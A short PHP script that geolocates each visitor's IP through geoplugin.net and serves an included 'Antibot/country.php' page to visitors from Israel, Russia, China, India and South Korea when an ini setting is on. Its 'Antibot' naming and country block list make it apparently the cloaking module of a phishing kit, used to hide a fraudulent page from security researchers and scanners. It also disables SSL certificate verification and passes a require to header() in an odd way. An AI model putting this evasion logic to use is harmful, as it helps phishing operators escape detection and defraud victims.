<?php
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_country = $tanitatikaram['country'];
if ($setting_country == 'on') {
    $ip = getenv("REMOTE_ADDR");
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    $countrycode = $details['geoplugin_countryCode'];


if ($countrycode == "IL") {
   header(require 'Antibot/country.php');
}
else if ($countrycode == "RU") {
   header(require 'Antibot/country.php');
} 
else if ($countrycode == "CN") {
   header(require 'Antibot/country.php');
}
else if ($countrycode == "IN") {
   header(require 'Antibot/country.php');
}
else if ($countrycode == "KR") {
   header(require 'Antibot/country.php');
}
};
?>